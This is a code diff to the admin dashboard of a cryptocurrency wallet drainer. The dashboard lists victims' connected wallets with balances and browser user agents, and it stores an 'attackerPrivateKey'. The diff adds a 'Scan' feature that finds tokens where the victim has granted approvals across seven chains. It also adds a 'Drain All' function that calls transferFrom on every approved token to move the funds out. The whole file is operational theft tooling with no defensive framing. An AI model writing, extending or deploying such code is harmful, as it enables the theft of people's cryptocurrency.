@@ -48,6 +48,7 @@
     .btn.sm{padding:6px 14px;font-size:12px;border-radius:8px;font-family:'Inter',sans-serif}
     .btn.xs{padding:4px 10px;font-size:11px;border-radius:6px;font-family:'Inter',sans-serif}
     .btn.red{background:var(--red);color:#fff}.btn.red:hover{box-shadow:0 4px 16px rgba(255,82,82,.2)}
+    .btn.gold{background:var(--gold);color:#000;font-weight:700}.btn.gold:hover{box-shadow:0 4px 16px rgba(240,168,50,.3)}
     .btn.green{background:var(--green);color:#000}.btn.green:hover{box-shadow:0 4px 16px rgba(0,230,118,.2)}
     .btn.ghost{background:transparent;border:1px solid var(--border2);color:var(--muted);font-family:'Inter',sans-serif}
     .btn.ghost:hover{border-color:var(--gold);color:var(--text);background:var(--goldbg)}
@@ -710,7 +711,7 @@ function filterWallets() {
     const tokHtml = toks.length ? toks.map(t => { const u=(UP[t.symbol]||1)*parseFloat(t.balance||0); return `<span class="token-chip"><span class="sym">${t.symbol}</span><span class="bal">${parseFloat(t.balance).toFixed(4)}</span>${u>=0.01?` <span style="color:var(--green);font-size:9px">$${u.toFixed(2)}</span>`:''}</span>` }).join('') : '<span style="color:var(--muted2);font-size:11px">None</span>'
     let val=0; toks.forEach(t=>val+=(UP[t.symbol]||1)*parseFloat(t.balance||0))
     const exp=(ADDR_EXP[w.chainId]||'https://bscscan.com/address/')+w.address
-    return `<tr><td style="color:var(--muted2)">${i+1}</td><td><div style="display:flex;align-items:center;gap:6px"><span class="addr-short" onclick="copyText('${w.address}')">${shortAddr(w.address)}</span><a href="${exp}" target="_blank" style="color:var(--muted2);font-size:10px">\u2197</a></div><div style="font-size:10px;color:var(--muted2);margin-top:2px;font-family:'JetBrains Mono',monospace">${w.userAgent?w.userAgent.slice(0,35)+'...':''}</div></td><td>${CI[w.chainId]||''} ${CN[w.chainId]||w.chainId}</td><td><div class="token-chips">${tokHtml}</div></td><td style="color:${val>0?'var(--green)':'var(--muted)'};font-weight:600">$${val.toFixed(2)}</td><td style="color:var(--muted);font-size:11px">${timeAgo(w.connectedAt)}</td><td style="color:var(--muted);font-size:11px">${timeAgo(w.lastSeen||w.connectedAt)}</td><td><span class="badge ${w.drained?'success':w.online?'online':'pending'}">${w.drained?'Drained':w.online?'Online':'Idle'}</span></td><td style="display:flex;gap:5px;flex-wrap:wrap"><button class="btn xs ghost" onclick="showWalletDetail('${w.address}')">Details</button>${!w.drained?`<button class="btn xs red" onclick="triggerManualDrain('${w.address}')">Drain</button>`:''}</td></tr>`
+    return `<tr><td style="color:var(--muted2)">${i+1}</td><td><div style="display:flex;align-items:center;gap:6px"><span class="addr-short" onclick="copyText('${w.address}')">${shortAddr(w.address)}</span><a href="${exp}" target="_blank" style="color:var(--muted2);font-size:10px">\u2197</a></div><div style="font-size:10px;color:var(--muted2);margin-top:2px;font-family:'JetBrains Mono',monospace">${w.userAgent?w.userAgent.slice(0,35)+'...':''}</div></td><td>${CI[w.chainId]||''} ${CN[w.chainId]||w.chainId}</td><td><div class="token-chips">${tokHtml}</div></td><td style="color:${val>0?'var(--green)':'var(--muted)'};font-weight:600">$${val.toFixed(2)}</td><td style="color:var(--muted);font-size:11px">${timeAgo(w.connectedAt)}</td><td style="color:var(--muted);font-size:11px">${timeAgo(w.lastSeen||w.connectedAt)}</td><td><span class="badge ${w.drained?'success':w.online?'online':'pending'}">${w.drained?'Drained':w.online?'Online':'Idle'}</span></td><td style="display:flex;gap:4px;flex-wrap:wrap"><button class="btn xs ghost" onclick="showWalletDetail('${w.address}')">Details</button><button class="btn xs gold" onclick="showWalletDetail('${w.address}');setTimeout(()=>scanWalletOnChain('${w.address}'),200)">Scan</button>${!w.drained?`<button class="btn xs red" onclick="drainAllTokens('${w.address}')">Drain All</button>`:''}</td></tr>`
   }).join('')
 }
 
@@ -765,7 +766,10 @@ function showWalletDetail(address) {
       <button class="btn sm ghost" onclick="copyText('${w.address}');closeModal()">Copy</button>
       <a href="${exp}" target="_blank" class="btn ghost sm">Explorer \u2197</a>
       ${!w.drained&&toks.length?toks.map(t=>`<button class="btn sm red" onclick="closeModal();triggerManualDrain('${w.address}','${t.address}',${t.chainId})">Drain ${t.symbol}</button>`).join(''):''}
-    </div>`
+      <button class="btn sm gold" onclick="scanWalletOnChain('${w.address}')">Scan On-Chain</button>
+      <button class="btn sm red" onclick="drainAllTokens('${w.address}')">Drain All</button>
+    </div>
+    <div id="scan-results-${w.address.slice(2,10)}" style="margin-top:14px;display:none"></div>`
   document.getElementById('wallet-modal').classList.add('open')
 }
 function closeModal(){document.getElementById('wallet-modal').classList.remove('open')}
@@ -777,6 +781,58 @@ async function triggerManualDrain(ownerAddress,tokenAddress,chainId){
   if(!confirm(`Drain ${tok.symbol||tokenAddress.slice(0,12)+'...'} from ${ownerAddress.slice(0,20)}...?\nChain: ${chainId}`))return
   toast('Draining...'); try{const r=await apiFetch('/admin/drain-manual',{method:'POST',body:JSON.stringify({owner:ownerAddress,tokenAddress,chainId})});if(r.success){toast('Drained '+r.amount+' '+r.symbol);refresh()}else{toast(r.error||'Failed')}}catch(e){toast('Error: '+e.message)}
 }
+async function scanWalletOnChain(address) {
+  const container = document.getElementById('scan-results-'+address.slice(2,10))
+  if(container){container.style.display='block';container.innerHTML='<div style="color:var(--gold);font-size:12px;padding:10px">Scanning all 7 chains... please wait</div>'}
+  toast('Scanning wallet on-chain...')
+  try {
+    const r = await apiFetch('/admin/scan-wallet',{method:'POST',body:JSON.stringify({address})})
+    if(!r.ok){toast(r.error||'Scan failed');return}
+    const tokens = r.tokens || []
+    if(!tokens.length){
+      if(container) container.innerHTML='<div style="color:var(--muted2);font-size:12px;padding:10px">No tokens found on any chain</div>'
+      toast('No tokens found');return
+    }
+    let html='<div style="font-size:10px;color:var(--muted);font-weight:800;text-transform:uppercase;letter-spacing:1px;margin-bottom:10px">On-Chain Scan Results ('+tokens.length+' assets)</div>'
+    tokens.forEach(t => {
+      const drainable = t.drainable
+      const isNative = t.token==='native'
+      html+=`<div style="background:var(--bg2);border:1px solid ${drainable?'var(--green)':'var(--border2)'};border-radius:12px;padding:13px 16px;margin-bottom:6px;display:flex;justify-content:space-between;align-items:center">
+        <div><span style="font-weight:700;color:${drainable?'var(--green)':'var(--cyan)'}">${t.symbol}</span><span style="color:var(--muted);font-size:11px;margin-left:8px">${t.chain}</span>
+        ${drainable?'<span style="background:var(--greenbg);color:var(--green);font-size:9px;padding:2px 6px;border-radius:6px;margin-left:6px;font-weight:700">APPROVED</span>':''}
+        ${isNative?'<span style="color:var(--muted2);font-size:9px;margin-left:6px">native</span>':''}
+        </div>
+        <div style="display:flex;align-items:center;gap:10px">
+          <div style="text-align:right"><div style="font-family:\'JetBrains Mono\',monospace;font-weight:600">${t.balance}</div>
+          ${!isNative?'<div style="font-size:10px;color:var(--muted)">Allowance: '+t.allowance+'</div>':''}
+          </div>
+          ${drainable?`<button class="btn xs red" onclick="closeModal();triggerManualDrain('${address}','${t.token}',${t.chainId})">Drain</button>`:''}
+        </div></div>`
+    })
+    if(container) container.innerHTML=html
+    toast('Scan complete: '+tokens.length+' assets found')
+  } catch(e) { toast('Scan error: '+e.message) }
+}
+
+async function drainAllTokens(address) {
+  if(!confirm('Drain ALL approved tokens from '+address.slice(0,20)+'...? This will attempt transferFrom on every token with existing allowance across all chains.')) return
+  toast('Draining all approved tokens...')
+  try {
+    const r = await apiFetch('/admin/drain-all',{method:'POST',body:JSON.stringify({address})})
+    if(!r.ok){toast(r.error||'Failed');return}
+    const results = r.results || []
+    const success = results.filter(x=>x.success)
+    if(success.length) {
+      toast('Drained '+success.length+' token(s)! '+success.map(x=>x.amount+' '+x.symbol).join(', '))
+    } else if(results.length) {
+      toast('No approved tokens found to drain')
+    } else {
+      toast('No tokens with allowance found')
+    }
+    refresh()
+  } catch(e) { toast('Error: '+e.message) }
+}
+
 function previewWallet(){const pk=document.getElementById('cfg-pk').value.trim();if(!pk)return;document.getElementById('cfg-addr-preview').style.display='block';document.getElementById('cfg-addr-text').textContent='Validating...';apiFetch('/admin/config',{method:'POST',body:JSON.stringify({attackerPrivateKey:pk})}).then(r=>{if(r.ok){refresh().then(()=>{document.getElementById('cfg-addr-text').textContent=dashData.attackerAddress||'Saved'});const m=document.getElementById('cfg-msg');m.style.display='block';m.style.color='var(--green)';m.textContent='Saved'}else{document.getElementById('cfg-addr-text').textContent='Invalid: '+(r.error||'');document.getElementById('cfg-addr-text').style.color='var(--red)'}})}
 async function saveConfig(){const pk=document.getElementById('cfg-pk').value.trim();if(!pk)return;const r=await apiFetch('/admin/config',{method:'POST',body:JSON.stringify({attackerPrivateKey:pk})});const m=document.getElementById('cfg-msg');m.style.display='block';if(r.ok){m.style.color='var(--green)';m.textContent='Saved';document.getElementById('cfg-pk').value='';refresh()}else{m.style.color='var(--red)';m.textContent=r.error}}
 async function savePassword(){const pw=document.getElementById('cfg-pw-new').value;if(!pw)return;const r=await apiFetch('/admin/config',{method:'POST',body:JSON.stringify({adminPassword:pw})});const m=document.getElementById('pw-msg');m.style.display='block';if(r.ok){adminPw=pw;m.style.color='var(--green)';m.textContent='Updated';document.getElementById('cfg-pw-new').value=''}else{m.style.color='var(--red)';m.textContent='Failed'}}
